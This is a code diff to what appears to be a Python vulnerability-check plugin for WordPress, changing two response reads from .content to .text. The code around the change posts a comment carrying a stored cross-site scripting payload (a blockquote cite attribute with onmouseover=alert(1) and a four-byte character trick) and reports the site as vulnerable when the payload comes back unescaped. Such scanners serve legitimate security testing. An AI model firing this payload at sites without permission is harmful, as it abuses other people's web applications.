@@ -58,7 +58,7 @@ class Poc(ABPoc):
                 random.sample(string.letters, length))
             try:
                 post_id = re.search(r'post-(?P<post_id>[\\d]+)',
-                                    requests.get(target).content).group('post_id')
+                                    requests.get(target).text).group('post_id')
             except:
                 return
             ttys = "test<blockquote cite='%s onmouseover=alert(1)// \\xD8\\x34\\xDF\\x06'>"
@@ -72,7 +72,7 @@ class Poc(ABPoc):
                 'comment_parent': 0,
             }
 
-            content = requests.post(verify_url, data=payload).content
+            content = requests.post(verify_url, data=payload).text
             if '<blockquote cite=&#8217;%s onmouseover=alert(1)' % flag in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
